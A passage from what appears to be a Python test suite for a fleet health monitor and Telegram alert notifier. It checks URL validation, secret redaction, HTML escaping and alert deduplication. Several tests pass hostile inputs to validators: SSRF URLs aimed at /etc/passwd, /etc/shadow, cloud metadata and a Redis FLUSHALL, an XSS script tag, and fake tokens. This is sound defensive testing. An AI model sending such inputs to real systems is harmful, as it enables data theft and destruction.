                    "name": "AGY Fleet & Clef Mesh",
                    "status": "HEALTHY",
                    "score": 95,
                    "active_nodes": 20,
                    "total_nodes": 21,
                    "consensus_score": 95.0,
                    "sla_passed": True,
                    "total_jobs_tokens": 347802,
                    "total_fleet_tokens": 68838970,
                    "top_3_tasks": [
                        {
                            "job_id": "c6e5ff82",
                            "node_name": "nebula",
                            "model": "claude-opus-4.8",
                            "total_tokens": 200000,
                            "prompt": "Refactor architecture and audit tokenomics across all nodes",
                        },
                        {
                            "job_id": "a1b2c3d4",
                            "node_name": "lthn.Ariana",
                            "model": "gemini-3.1-pro-high",
                            "total_tokens": 100000,
                            "prompt": "Perform deep math proof on median-0 animation pipeline",
                        },
                        {
                            "job_id": "f9e8d7c6",
                            "node_name": "pro-1",
                            "model": "gemini-3.8-flash-high",
                            "total_tokens": 47802,
                            "prompt": "Generate unit tests for entropy degradation detector",
                        },
                    ],
                    "top_5_nodes": [
                        {
                            "name": "nebula",
                            "tier": "ultra",
                            "requests_served": 500,
                            "tokens_consumed": 30000000,
                            "active_jobs": 1,
                        },
                        {
                            "name": "lthn.Ariana",
                            "tier": "ultra",
                            "requests_served": 400,
                            "tokens_consumed": 20000000,
                            "active_jobs": 0,
                        },
                        {
                            "name": "pro-1",
                            "tier": "pro",
                            "requests_served": 300,
                            "tokens_consumed": 10000000,
                            "active_jobs": 0,
                        },
                        {
                            "name": "pro-2",
                            "tier": "pro",
                            "requests_served": 200,
                            "tokens_consumed": 5000000,
                            "active_jobs": 0,
                        },
                        {
                            "name": "pro-3",
                            "tier": "pro",
                            "requests_served": 100,
                            "tokens_consumed": 3838970,
                            "active_jobs": 0,
                        },
                    ],
                }
            ],
        },
    }

    digest_html = notifier.format_hourly_digest(scan_result)
    assert "Tổng lượng Tokens đã dùng" in digest_html
    assert "Top 3 Tasks dùng nhiều Tokens nhất" in digest_html
    assert "Top 5 Nodes làm việc nhiều nhất" in digest_html
    assert "c6e5ff82" in digest_html
    assert "nebula" in digest_html
    assert "lthn.Ariana" in digest_html


# ==============================================================================
# Nebula Cycle 31 Adversarial Unit Tests: Telemetry Hardening & Prompt Sanitization
# ==============================================================================
def test_prompt_with_secrets_and_html_is_sanitized(tmp_path):
    """Nebula Cycle 31: Prompt sanitization redacts secrets, escapes HTML, and normalizes whitespace in digest."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)

    raw_prompt = "ghp_1234567890abcdefghijklmnopqrstuvwxyz12 <script>alert(1)</script> & password=superSecretPass123"

    scan_result = {
        "overall_health_score": 90,
        "severity": "HEALTHY",
        "cron": {
            "cron_health_score": 100,
            "clogged_jobs": [],
            "drift_skipped_jobs": [],
            "auth_failed_jobs": [],
            "rate_limited_jobs": [],
            "overdue_jobs": [],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 5.0},
        },
        "entropy": {
            "entropy_health_score": 85,
            "streams": [
                {
                    "name": "AGY Fleet & Clef Mesh",
                    "status": "HEALTHY",
                    "score": 90,
                    "active_nodes": 18,
                    "total_nodes": 21,
                    "consensus_score": 90.0,
                    "sla_passed": True,
                    "total_jobs_tokens": 10000,
                    "total_fleet_tokens": 50000,
                    "top_3_tasks": [
                        {
                            "job_id": "vuln-task-1",
                            "node_name": "node-1",
                            "model": "gemini-3.8-flash-high",
                            "total_tokens": 10000,
                            "prompt": raw_prompt,
                        }
                    ],
                    "top_5_nodes": [],
                }
            ],
        },
    }

    digest_html = notifier.format_hourly_digest(scan_result)

    assert "[REDACTED]" in digest_html
    assert "ghp_1234567890abcdefghijklmnopqrstuvwxyz12" not in digest_html
    assert "superSecretPass123" not in digest_html
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in digest_html
    assert "<script>" not in digest_html

    # Also directly verify _safe_format_prompt
    snippet = notifier._safe_format_prompt(raw_prompt, limit=60)
    assert "[REDACTED]" in snippet
    assert "superSecretPass123" not in snippet
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in snippet
    assert "<script>" not in snippet


def test_numeric_telemetry_resilience_to_nan_none_negative():
    """Nebula Cycle 31: Resilience against NaN, None, negative, and invalid numeric values in fleet telemetry."""
    detector = EntropyDegradationDetector(
        fleet_summary_url="http://mock-summary",
        fleet_council_url="http://mock-council",
        fleet_nodes_url="http://mock-nodes",
        fleet_jobs_url="http://mock-jobs",
    )

    summary_resp = json.dumps({"online_nodes": 18, "total_nodes": 21}).encode("utf-8")
    council_resp = json.dumps({"composite_consensus_score": 90.0, "sla_passed": True}).encode("utf-8")

    nodes_data = {
        "nodes": [
            {
                "name": "chaotic-node",
                "tier": "pro",
                "requests_served": -50,
                "quota_weekly_consumed": None,
                "active_jobs": "invalid",
            }
        ]
    }
    nodes_resp = json.dumps(nodes_data).encode("utf-8")

    jobs_data = {
        "jobs": [
            {
                "job_id": "job-nan-tokens",
                "node_name": "chaotic-node",
                "model": "gemini-3.8-flash-high",
                "total_tokens": "NaN",
                "prompt": "Test prompt",
            }
        ]
    }
    jobs_resp = json.dumps(jobs_data).encode("utf-8")

    def mock_urlopen(req, *args, **kwargs):
        mock_obj = MagicMock()
        url = req.full_url if hasattr(req, "full_url") else str(req)
        if "mock-summary" in url:
            mock_obj.read.return_value = summary_resp
        elif "mock-council" in url:
            mock_obj.read.return_value = council_resp
        elif "mock-nodes" in url:
            mock_obj.read.return_value = nodes_resp
        elif "mock-jobs" in url:
            mock_obj.read.return_value = jobs_resp
        else:
            mock_obj.read.return_value = b"{}"
        mock_obj.__enter__.return_value = mock_obj
        return mock_obj

    with patch("urllib.request.urlopen", side_effect=mock_urlopen):
        res = detector.check_stream_5_fleet_mesh()

    assert res["status"] in ("HEALTHY", "DEGRADED", "CRITICAL")
    assert res["total_fleet_tokens"] >= 0
    assert res["total_jobs_tokens"] >= 0
    assert len(res["top_5_nodes"]) == 1
    node = res["top_5_nodes"][0]
    assert node["requests_served"] >= 0
    assert node["tokens_consumed"] >= 0
    assert node["active_jobs"] >= 0
    assert len(res["top_3_tasks"]) == 1
    task = res["top_3_tasks"][0]
    assert task["total_tokens"] >= 0


def test_fleet_url_rejects_dangerous_schemes():
    """Nebula Cycle 31: Enforce strict URL scheme and hostname validation on fleet endpoints (SSRF defense)."""
    with pytest.raises(ValueError):
        _validate_fleet_url("file:///etc/passwd")

    with pytest.raises(ValueError):
        _validate_fleet_url("gopher://localhost:70")

    assert _validate_fleet_url("http://localhost:7777/api/fleet/nodes") == "http://localhost:7777/api/fleet/nodes"
    assert _validate_fleet_url("http://mock-summary") == "http://mock-summary"

    with pytest.raises(ValueError):
        EntropyDegradationDetector(fleet_summary_url="file:///etc/passwd")

    with pytest.raises(ValueError):
        EntropyDegradationDetector(fleet_council_url="gopher://localhost:70")


def test_rejects_cloud_metadata():
    """Nebula Cycle 32: Reject AWS/GCP/Azure cloud metadata endpoint (169.254.169.254)."""
    with pytest.raises(ValueError, match="blocked address class"):
        _validate_fleet_url("http://169.254.169.254/latest/meta-data/")


def test_rejects_private_range():
    """Nebula Cycle 32: Reject RFC1918 private IP ranges (10.0.0.5, 192.168.x)."""
    with pytest.raises(ValueError, match="blocked address class"):
        _validate_fleet_url("http://10.0.0.5/nodes")


def test_rejects_non_http_scheme():
    """Nebula Cycle 32: Reject non-http schemes."""
    with pytest.raises(ValueError, match="Invalid scheme"):
        _validate_fleet_url("file:///etc/passwd")


def test_rejects_bad_port():
    """Nebula Cycle 32: Reject ports not in allowlist (e.g. SSH port 22)."""
    with pytest.raises(ValueError, match="Forbidden port"):
        _validate_fleet_url("http://example.com:22/nodes")


def test_redacts_credentials_in_error():
    """Nebula Cycle 32: Ensure embedded credentials are redacted from ValueError messages (CWE-532/209)."""
    try:
        _validate_fleet_url("ftp://user:SECRET@example.com/x")
    except ValueError as e:
        assert "SECRET" not in str(e)
        assert "redacted" in str(e)


def test_allows_mock_fixture():
    """Nebula Cycle 32: Allow mock test fixture hostnames and ports."""
    assert _validate_fleet_url("http://mock-fleet:8080/summary").startswith("http://mock-fleet")


def test_allows_localhost():
    """Nebula Cycle 32: Allow localhost on approved ports."""
    assert _validate_fleet_url("http://localhost:8080/nodes") == "http://localhost:8080/nodes"
    assert _validate_fleet_url("http://localhost:7777/api/fleet/nodes") == "http://localhost:7777/api/fleet/nodes"


@pytest.mark.parametrize("val,expected", [
    (None, 0), ("12", 12), ("-5", 0), (float("nan"), 0),
    (float("inf"), 0), ("abc", 0), (True, 1), ([], 0),
])
def test_safe_int_boundaries(val, expected):
    """Nebula Cycle 32: Test boundary conditions for _safe_int."""
    assert _safe_int(val) == expected


def test_safe_int_coercion_edge_cases():
    """Nebula Cycle 31: Unit verification for _safe_int boundary edge cases."""
    assert _safe_int(None) == 0
    assert _safe_int("NaN") == 0
    assert _safe_int("nan") == 0
    assert _safe_int("inf") == 0
    assert _safe_int("-inf") == 0
    assert _safe_int(float("nan")) == 0
    assert _safe_int(float("inf")) == 0
    assert _safe_int(-50) == 0
    assert _safe_int("-50") == 0
    assert _safe_int("invalid") == 0
    assert _safe_int(1234) == 1234
    assert _safe_int("1234") == 1234
    assert _safe_int("1234.9") == 1234
    assert _safe_int(-50, min_val=-100) == -50
    assert _safe_int(None, default=10, min_val=0) == 10


def test_adversarial_ssrf_metadata_rejection():
    """Adversarial Test Spec #1: Reject Cloud Metadata and Loopback vectors (CWE-918)."""
    ssrf_vectors = [
        "http://169.254.169.254/computeMetadata/v1/",
        "http://127.0.0.1:28069/web/database/selector",
        "http://127.1:8080",
        "http://[::1]:9000/metrics",
        "http://10.0.0.15/status",
        "file:///etc/shadow",
        "gopher://127.0.0.1:6379/_FLUSHALL",
    ]
    for vector in ssrf_vectors:
        with pytest.raises(ValueError):
            _validate_fleet_url(vector, allow_private=False)


def test_adversarial_slowloris_max_bytes_enforcement():
    """Adversarial Test Spec #2: Enforce strict byte ceiling on chunked/stream payloads (CWE-400)."""
    oversized_data = b"A" * (MAX_FLEET_BYTES + 1024)
    mock_resp = MagicMock()
    mock_resp.read.return_value = oversized_data
    mock_resp.__enter__.return_value = mock_resp

    with patch("urllib.request.urlopen", return_value=mock_resp):
        with pytest.raises(ValueError, match="Payload exceeded max permitted length"):
            _safe_fetch_json("http://fleet.internal.mesh/metrics", timeout=5.0, allow_private=True)


def test_adversarial_numeric_boundary_and_fuzz():
    """Adversarial Test Spec #3: Boundary saturation and NaN/Inf isolation."""
    assert _safe_int("0") == 0
    assert _safe_int(str(MAX_TELEMETRY_VALUE)) == MAX_TELEMETRY_VALUE
    assert _safe_int(str(MAX_TELEMETRY_VALUE + 1000)) == MAX_TELEMETRY_VALUE
    assert _safe_int("1e30") == MAX_TELEMETRY_VALUE
    assert _safe_int("-1e30") == 0
    assert _safe_int(None) == 0
    assert _safe_int({}) == 0
    assert _safe_int("1e500") == 0
    assert _safe_int("-1e500") == 0


# ==============================================================================
# 3. Tests: CompositeHealthCalculator
# ==============================================================================
def test_composite_health_calculator():
    # 1. Nominal / Healthy state
    score_healthy, sev_healthy = CompositeHealthCalculator.calculate(
        cron_score=95, entropy_score=90, mesh_score=100, ticker_score=100
    )
    # 0.35*95 + 0.35*90 + 0.15*100 + 0.15*100 = 33.25 + 31.5 + 15 + 15 = 94.75 -> 95
    assert score_healthy >= 85
    assert sev_healthy == "HEALTHY"

    # 2. Warning state
    score_warn, sev_warn = CompositeHealthCalculator.calculate(
        cron_score=60, entropy_score=70, mesh_score=80, ticker_score=100
    )
    # 0.35*60 + 0.35*70 + 0.15*80 + 0.15*100 = 21 + 24.5 + 12 + 15 = 72.5 -> 72
    assert 60 <= score_warn < 85
    assert sev_warn == "WARNING"

    # 3. Critical state
    score_crit, sev_crit = CompositeHealthCalculator.calculate(
        cron_score=20, entropy_score=30, mesh_score=50, ticker_score=0
    )
    # 0.35*20 + 0.35*30 + 0.15*50 + 0 = 7 + 10.5 + 7.5 = 25
    assert score_crit < 60
    assert sev_crit == "CRITICAL"


# ==============================================================================
# 4. Tests: HermesTelegramNotifier
# ==============================================================================
def test_hermes_telegram_notifier(tmp_path):
    env_file = tmp_path / ".env"
    env_file.write_text(f"TELEGRAM_BOT_TOKEN=test-token-123\nTELEGRAM_ALLOWED_USERS={TEST_CHAT_ID}\n")

    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)
    assert notifier.bot_token == "test-token-123"
    assert notifier.target_chat_id == TEST_CHAT_ID

    scan_sample = {
        "overall_health_score": 45,
        "severity": "CRITICAL",
        "cron": {
            "cron_health_score": 20,
            "clogged_jobs": [{"job_name": "media-producer", "consecutive_failures": 97, "last_error": "Drift skip"}],
            "drift_skipped_jobs": [{"job_name": "media-producer", "model_snapshot": "cx/gpt-5.6-luna"}],
            "auth_failed_jobs": [{"job_name": "gmail-sync", "last_error": "invalid_grant"}],
            "rate_limited_jobs": [],
            "overdue_jobs": [],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 15.0},
        },
        "entropy": {
            "entropy_health_score": 40,
            "streams": [
                {"name": "Stock News Feed", "status": "CRITICAL", "hours_since_crawl": 120.0, "articles_24h": 0, "unique_symbols": 0},
                {"name": "Media Asset Bank 24/7", "status": "CRITICAL", "completed_videos": 0, "current_hour_lag": 15},
            ],
        },
    }

    # Format alerts
    alert_html = notifier.format_urgent_alert(scan_sample)
    assert "HERMES CRITICAL ALERT" in alert_html
    assert "media-producer" in alert_html
    assert "gmail-sync" in alert_html

    digest_html = notifier.format_hourly_digest(scan_sample)
    assert "HERMES AGENT" in digest_html
    assert "Composite Health" in digest_html

    # Test delivery mock
    # Before providing a routable format token, fail-closed send guard suppresses delivery
    assert notifier.send_alert(alert_html) is False
    assert notifier.send_digest(digest_html) is False

    # With routable bot token structure, delivery is dispatched to urlopen
    notifier.bot_token = "123456789:ABCdefGhIjkLmNoPqRsTuVwXyZ_12345"
    mock_resp = MagicMock()
    mock_resp.read.return_value = json.dumps({"ok": True}).encode("utf-8")
    mock_resp.__enter__.return_value = mock_resp

    with patch("urllib.request.urlopen", return_value=mock_resp):
        assert notifier.send_alert(alert_html) is True
        assert notifier.send_digest(digest_html) is True


def test_notifier_fail_closed_send_guard(tmp_path):
    """Cycle 28: Fail-closed guard strictly validates token format and suppresses non-live/test sends."""
    # Token format structural validation
    assert HermesTelegramNotifier.is_valid_token_format("test-token-123") is False
    assert HermesTelegramNotifier.is_valid_token_format("dummy") is False
    assert HermesTelegramNotifier.is_valid_token_format("placeholder") is False
    assert HermesTelegramNotifier.is_valid_token_format("none") is False
    assert HermesTelegramNotifier.is_valid_token_format(None) is False
    assert HermesTelegramNotifier.is_valid_token_format("") is False
    assert HermesTelegramNotifier.is_valid_token_format("12345") is False
    assert HermesTelegramNotifier.is_valid_token_format("test-123456789:ABCdefGhIjkLmNoPqRsTuVwXyZ_12345") is False
    assert HermesTelegramNotifier.is_valid_token_format("123456789:ABCdefGhIjkLmNoPqRsTuVwXyZ_12345") is True
    assert HermesTelegramNotifier.is_valid_token_format('"123456789:ABCdefGhIjkLmNoPqRsTuVwXyZ_12345"') is True

    # Assert calling _send_payload with dummy token returns False immediately and calls 0 network requests
    env_file = tmp_path / ".env"
    env_file.write_text(f"TELEGRAM_BOT_TOKEN=dummy\nTELEGRAM_ALLOWED_USERS={TEST_CHAT_ID}\n")
    notifier_dummy = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)

    with patch("urllib.request.urlopen") as mock_urlopen:
        sent = notifier_dummy._send_payload("<b>Test Alert</b>")
        assert sent is False
        mock_urlopen.assert_not_called()

    # Assert calling with test-token returns False immediately and calls 0 network requests
    notifier_test = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID, bot_token="test-token-123")
    with patch("urllib.request.urlopen") as mock_urlopen:
        sent = notifier_test._send_payload("<b>Test Alert</b>")
        assert sent is False
        mock_urlopen.assert_not_called()

    # Assert HERMES_SUPPRESS_TELEGRAM=1 suppresses send even with a valid token format
    notifier_valid = HermesTelegramNotifier(
        env_file=env_file,
        target_chat_id=TEST_CHAT_ID,
        bot_token="123456789:ABCdefGhIjkLmNoPqRsTuVwXyZ_12345",
    )
    with patch.dict(os.environ, {"HERMES_SUPPRESS_TELEGRAM": "1"}):
        with patch("urllib.request.urlopen") as mock_urlopen:
            sent = notifier_valid._send_payload("<b>Test Alert</b>")
            assert sent is False
            mock_urlopen.assert_not_called()


def test_retry_is_idempotent_and_never_reexposes_secrets(tmp_path, caplog):
    """Cycle 28: Retries on send_payload flakiness/drops are idempotent and never emit secrets to logs (CWE-532)."""
    env_file = tmp_path / ".env"
    bot_token = "123456789:SECRET_BOT_TOKEN_RETRY_1234567890123"
    api_secret = "SUPER_SECRET_PAYLOAD_CREDENTIAL_9999"
    env_file.write_text(f"TELEGRAM_BOT_TOKEN={bot_token}\nAPI_SECRET={api_secret}\n")

    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)

    raw_payload = f"<b>Alert</b>: Cron job failed with secret {api_secret}"
    original_payload = str(raw_payload)

    # Simulate network drop / flakiness raising an exception containing token or credentials
    net_err = ConnectionResetError(f"Connection reset by peer while contacting telegram with token {bot_token}")

    with patch("urllib.request.urlopen", side_effect=net_err):
        for _ in range(3):
            caplog.clear()
            with caplog.at_level(logging.INFO):
                success = notifier._send_payload(raw_payload)
                assert success is False

                # Verifies secrets are never emitted to logs during failures
                assert bot_token not in caplog.text
                assert api_secret not in caplog.text
                assert "[REDACTED]" in caplog.text

    # Verifies payloads remain clean / unmutated
    assert raw_payload == original_payload


def test_send_payload_redacts_secrets_in_http_error_logging(tmp_path, caplog):
    """Cycle 28: HTTPError response body echoing secrets is redacted before logging (CWE-532)."""
    env_file = tmp_path / ".env"
    bot_token = "987654321:LIVE_BOT_TOKEN_HTTP_ERR_1234567890"
    oauth_secret = "SENSITIVE_OAUTH_TOKEN_BEARER_88888"
    env_file.write_text(f"TELEGRAM_BOT_TOKEN={bot_token}\nOAUTH_SECRET={oauth_secret}\n")

    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)

    err_body = (
        f'{{"ok": false, "error_code": 401, "description": "Unauthorized token: {bot_token} and {oauth_secret}"}}'
    ).encode("utf-8")

    http_error = urllib.error.HTTPError(
        url=f"https://api.telegram.org/bot{bot_token}/sendMessage",
        code=401,
        msg="Unauthorized",
        hdrs={},
        fp=io.BytesIO(err_body),
    )

    with patch("urllib.request.urlopen", side_effect=http_error):
        caplog.clear()
        with caplog.at_level(logging.INFO):
            success = notifier._send_payload("Test Alert Message")
            assert success is False

            # Asserts raw secret is absent and [REDACTED] is present
            assert bot_token not in caplog.text
            assert oauth_secret not in caplog.text
            assert "[REDACTED]" in caplog.text
            assert "Telegram HTTP 401 error:" in caplog.text


# ==============================================================================
# Cycle 29 Adversarial Unit Tests: HermesTelegramNotifier Egress Hardening & Dedup
# ==============================================================================
def test_secret_in_alert_body_is_not_egressed(tmp_path):
    """Cycle 29 (CWE-359): Alert body credentials and secrets are scrubbed before Telegram outbound egress."""
    raw_secret = "ghp_1234567890abcdefghijklmnopqrstuvwxyz"
    password = "SuperSecretPassword123"
    bot_token = "123456789:ABCdefGhIjkLmNoPqRsTuVwXyZ_12345"

    env_file = tmp_path / ".env"
    env_file.write_text(f"TELEGRAM_BOT_TOKEN={bot_token}\nGITHUB_TOKEN={raw_secret}\n")

    notifier = HermesTelegramNotifier(
        env_file=env_file,
        target_chat_id=TEST_CHAT_ID,
        bot_token=bot_token,
    )
    assert raw_secret in notifier._known_secrets

    alert_body = f"<b>Alert</b>: Cron failure with token {raw_secret} and password={password}"

    mock_resp = MagicMock()
    mock_resp.read.return_value = json.dumps({"ok": True}).encode("utf-8")
    mock_resp.__enter__.return_value = mock_resp

    with patch("urllib.request.urlopen", return_value=mock_resp) as mock_urlopen:
        sent = notifier._send_payload(alert_body)
        assert sent is True
        mock_urlopen.assert_called_once()
        req = mock_urlopen.call_args[0][0]
        req_data = req.data.decode("utf-8")
        assert raw_secret not in req_data
        assert password not in req_data
        assert "[REDACTED]" in req_data


def test_token_format_rejects_trivial_secret_segment():
    """Cycle 29: Fail-closed token validation enforces minimum secret segment length >= 30 chars."""
    assert HermesTelegramNotifier._MIN_SECRET_SEGMENT == 30
    assert HermesTelegramNotifier.is_valid_token_format("1:a") is False
    assert HermesTelegramNotifier.is_valid_token_format("123456:short") is False
    assert HermesTelegramNotifier.is_valid_token_format("123456789:" + "a" * 29) is False
    assert HermesTelegramNotifier.is_valid_token_format("123456789:" + "a" * 30) is True


def test_suppression_pinned_at_construction(tmp_path):
    """Cycle 29: Suppression state is pinned at construction time to prevent runtime unsuppress bypass."""
    env_file = tmp_path / ".env"
    bot_token = "123456789:ABCdefGhIjkLmNoPqRsTuVwXyZ_12345"
    env_file.write_text(f"TELEGRAM_BOT_TOKEN={bot_token}\n")

    with patch.dict(os.environ, {"HERMES_SUPPRESS_TELEGRAM": "1"}):
        notifier = HermesTelegramNotifier(
            env_file=env_file,
            target_chat_id=TEST_CHAT_ID,
            bot_token=bot_token,
        )
        assert notifier._suppressed is True

    # Unset or change HERMES_SUPPRESS_TELEGRAM to "0"
    with patch.dict(os.environ, {"HERMES_SUPPRESS_TELEGRAM": "0"}):
        with patch("urllib.request.urlopen") as mock_urlopen:
            sent = notifier._send_payload("<b>Test Payload</b>")
            assert sent is False
            mock_urlopen.assert_not_called()

    # Also unsetting completely
    with patch.dict(os.environ, {}, clear=True):
        with patch("urllib.request.urlopen") as mock_urlopen:
            sent = notifier._send_payload("<b>Test Payload</b>")
            assert sent is False
            mock_urlopen.assert_not_called()


def test_retry_within_window_dispatches_once(tmp_path):
    """Cycle 29: Duplicate alert delivery within dedup window is suppressed (at-most-once protection)."""
    env_file = tmp_path / ".env"
    bot_token = "123456789:ABCdefGhIjkLmNoPqRsTuVwXyZ_12345"
    env_file.write_text(f"TELEGRAM_BOT_TOKEN={bot_token}\n")

    notifier = HermesTelegramNotifier(
        env_file=env_file,
        target_chat_id=TEST_CHAT_ID,
        bot_token=bot_token,
    )
    assert notifier._dedup_window_s == 90.0

    mock_resp = MagicMock()
    mock_resp.read.return_value = json.dumps({"ok": True}).encode("utf-8")
    mock_resp.__enter__.return_value = mock_resp

    with patch("urllib.request.urlopen", return_value=mock_resp) as mock_urlopen:
        # Calls _send_payload("<b>Test Payload</b>") with mock_urlopen returning b'{"ok": true}'
        payload1 = "<b>Test Payload</b>"
        # First call succeeds, mock_urlopen.call_count == 1
        res1 = notifier._send_payload(payload1)
        assert res1 is True
        assert mock_urlopen.call_count == 1

        # Second call within 90s returns True, mock_urlopen.call_count == 1 (deduped)
        res2 = notifier._send_payload(payload1)
        assert res2 is True
        assert mock_urlopen.call_count == 1

        # Call with different payload dispatches, mock_urlopen.call_count == 2
        payload2 = "<b>Different Payload</b>"
        res3 = notifier._send_payload(payload2)
        assert res3 is True
        assert mock_urlopen.call_count == 2

        # Simulates time advance > 90s, original payload dispatches again, mock_urlopen.call_count == 3
        digest1 = hashlib.sha256(payload1.encode("utf-8")).hexdigest()
        notifier._recent_sends[digest1] = time.monotonic() - 95.0

        res4 = notifier._send_payload(payload1)
        assert res4 is True
        assert mock_urlopen.call_count == 3


def test_dedup_persists_across_notifier_instances(tmp_path):
    """Nebula Cycle 30: Dedup ledger persists on disk across separate notifier instances."""
    env_file = tmp_path / ".env"
    bot_token = "123456789:ABCdefGhIjkLmNoPqRsTuVwXyZ_12345"
    env_file.write_text(f"TELEGRAM_BOT_TOKEN={bot_token}\n")
    ledger_path = tmp_path / "alert_dedup_ledger.json"

    notifier_a = HermesTelegramNotifier(
        env_file=env_file,
        target_chat_id=TEST_CHAT_ID,
        bot_token=bot_token,
        ledger_path=ledger_path,
    )

    mock_resp = MagicMock()
    mock_resp.read.return_value = json.dumps({"ok": True}).encode("utf-8")
    mock_resp.__enter__.return_value = mock_resp

    payload = "<b>Critical Anomaly Detected</b>"
    with patch("urllib.request.urlopen", return_value=mock_resp) as mock_urlopen:
        res_a = notifier_a.send_payload_result(payload)
        assert res_a == SendResult.DELIVERED
        assert mock_urlopen.call_count == 1
        assert ledger_path.exists()

        # Destroy instance A
        del notifier_a

        # Construct instance B with same ledger_path
        notifier_b = HermesTelegramNotifier(
            env_file=env_file,
            target_chat_id=TEST_CHAT_ID,
            bot_token=bot_token,
            ledger_path=ledger_path,
        )

        res_b = notifier_b.send_payload_result(payload)
        assert res_b == SendResult.DEDUPED
        assert notifier_b._send_payload(payload) is True
        assert mock_urlopen.call_count == 1


def test_dedup_fingerprint_ignores_timestamp(tmp_path):
    """Nebula Cycle 30: Dedup key normalizes timestamps so cosmetic timestamp changes do not defeat dedup."""
    env_file = tmp_path / ".env"
    bot_token = "123456789:ABCdefGhIjkLmNoPqRsTuVwXyZ_12345"
    env_file.write_text(f"TELEGRAM_BOT_TOKEN={bot_token}\n")
    ledger_path = tmp_path / "alert_dedup_ledger.json"

    notifier = HermesTelegramNotifier(
        env_file=env_file,
        target_chat_id=TEST_CHAT_ID,
        bot_token=bot_token,
        ledger_path=ledger_path,
    )

    mock_resp = MagicMock()
    mock_resp.read.return_value = json.dumps({"ok": True}).encode("utf-8")
    mock_resp.__enter__.return_value = mock_resp

    msg1 = "<b>Failure at 2026-10-13T07:00:00Z</b>: Database deadlock"
    msg2 = "<b>Failure at 2026-10-13T08:00:00Z</b>: Database deadlock"

    with patch("urllib.request.urlopen", return_value=mock_resp) as mock_urlopen:
        res1 = notifier.send_payload_result(msg1)
        assert res1 == SendResult.DELIVERED
        assert mock_urlopen.call_count == 1

        res2 = notifier.send_payload_result(msg2)
        assert res2 == SendResult.DEDUPED
        assert mock_urlopen.call_count == 1


def test_rotated_secret_not_in_known_set_is_still_scrubbed(tmp_path):
    """Nebula Cycle 30: GitHub PAT not present in known_secrets (.env) is redacted by regex."""
    empty_env = tmp_path / ".env"
    empty_env.write_text("# No secrets configured\n")
    bot_token = "123456789:ABCdefGhIjkLmNoPqRsTuVwXyZ_12345"

    notifier = HermesTelegramNotifier(
        env_file=empty_env,
        target_chat_id=TEST_CHAT_ID,
        bot_token=bot_token,
    )

    rotated_pat = "ghp_1234567890abcdefghijklmnopqrstuvwxyz12"
    assert rotated_pat not in notifier._known_secrets

    raw_text = f"Auth failed with token: {rotated_pat}"
    redacted = notifier.redact_secrets(raw_text)
    assert rotated_pat not in redacted
    assert "[REDACTED]" in redacted
    assert redacted == "Auth failed with token: [REDACTED]"


def test_send_result_distinguishes_deduped_from_delivered(tmp_path, monkeypatch):
    """Nebula Cycle 30: SendResult enum distinctly identifies delivered, deduped, suppressed, and failed."""
    env_file = tmp_path / ".env"
    bot_token = "123456789:ABCdefGhIjkLmNoPqRsTuVwXyZ_12345"
    env_file.write_text(f"TELEGRAM_BOT_TOKEN={bot_token}\n")
    ledger_path = tmp_path / "alert_dedup_ledger.json"

    notifier = HermesTelegramNotifier(
        env_file=env_file,
        target_chat_id=TEST_CHAT_ID,
        bot_token=bot_token,
        ledger_path=ledger_path,
    )

    mock_resp = MagicMock()
    mock_resp.read.return_value = json.dumps({"ok": True}).encode("utf-8")
    mock_resp.__enter__.return_value = mock_resp

    with patch("urllib.request.urlopen", return_value=mock_resp):
        payload = "<b>Status Check OK</b>"

        # 1. First send returns SendResult.DELIVERED
        res1 = notifier.send_payload_result(payload)
        assert res1 == SendResult.DELIVERED

        # 2. Second send within window returns SendResult.DEDUPED
        res2 = notifier.send_payload_result(payload)
        assert res2 == SendResult.DEDUPED

    # 3. Suppressed send returns SendResult.SUPPRESSED
    monkeypatch.setenv("HERMES_SUPPRESS_TELEGRAM", "1")
    suppressed_notifier = HermesTelegramNotifier(
        env_file=env_file,
        target_chat_id=TEST_CHAT_ID,
        bot_token=bot_token,
        ledger_path=tmp_path / "suppressed_ledger.json",
    )
    res_supp = suppressed_notifier.send_payload_result("<b>Suppressed Alert</b>")
    assert res_supp == SendResult.SUPPRESSED

    # 4. Invalid token send returns SendResult.FAILED
    monkeypatch.delenv("HERMES_SUPPRESS_TELEGRAM", raising=False)
    invalid_notifier = HermesTelegramNotifier(
        env_file=tmp_path / "empty.env",
        target_chat_id=TEST_CHAT_ID,
        bot_token="invalid-token",
        ledger_path=tmp_path / "invalid_ledger.json",
    )
    res_failed = invalid_notifier.send_payload_result("<b>Test Alert</b>")
    assert res_failed == SendResult.FAILED


def test_concurrent_sends_same_payload_dispatch_once(tmp_path):
    """Nebula Cycle 30: 5 concurrent threads attempting to send the same payload dispatch once."""
    env_file = tmp_path / ".env"
    bot_token = "123456789:ABCdefGhIjkLmNoPqRsTuVwXyZ_12345"
    env_file.write_text(f"TELEGRAM_BOT_TOKEN={bot_token}\n")
    ledger_path = tmp_path / "concurrent_ledger.json"

    notifiers = [
        HermesTelegramNotifier(
            env_file=env_file,
            target_chat_id=TEST_CHAT_ID,
            bot_token=bot_token,
            ledger_path=ledger_path,
        )
        for _ in range(5)
    ]

    mock_resp = MagicMock()
    mock_resp.read.return_value = json.dumps({"ok": True}).encode("utf-8")
    mock_resp.__enter__.return_value = mock_resp

    payload = "<b>Concurrent Storm Alert</b>: Database connection pool exhausted"

    with patch("urllib.request.urlopen", return_value=mock_resp) as mock_urlopen:
        def _send(idx: int):
            time.sleep(0.005)
            inst = notifiers[idx]
            result = inst.send_payload_result(payload)
            success_bool = inst._send_payload(payload)
            return result, success_bool

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(_send, i) for i in range(5)]
            results = [f.result() for f in futures]

        assert mock_urlopen.call_count == 1
        send_results = [r[0] for r in results]
        bool_results = [r[1] for r in results]
        assert all(b is True for b in bool_results)
